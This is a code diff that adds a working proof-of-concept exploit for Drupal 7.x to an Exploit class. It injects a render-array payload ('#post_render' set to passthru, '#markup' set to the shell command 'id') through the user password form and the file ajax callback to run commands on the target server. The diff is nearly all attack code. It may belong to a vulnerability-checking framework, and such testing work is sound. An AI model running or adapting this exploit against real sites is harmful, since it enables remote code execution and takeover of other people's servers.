@@ -14,8 +14,30 @@ class Exploit(object):
         super(Exploit, self).__init__()
 
     def poc(self, url):
-        # TODO
-        pass
+        # PoC for Drupal 7.x
+        params = {
+            'q': 'user/password',
+            'name[#post_render][]': 'passthru',
+            'name[#markup]': 'id',
+            'name[#type]': 'markup'
+        }
+
+        data = {
+            'form_id': 'user_pass',
+            '_triggering_element_name': 'name'
+        }
+
+        r = requests.post(url, data=data, params=params)
+
+        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
+        if m:
+            found = m.group(1)
+            params = {'q': 'file/ajax/name/#value/' + found}
+            data = {'form_build_id': found}
+            r = requests.post(url, data=data, params=params)
+            if "uid" in r.text:
+                return True
+        return False
 
 
 if __name__ == '__main__':
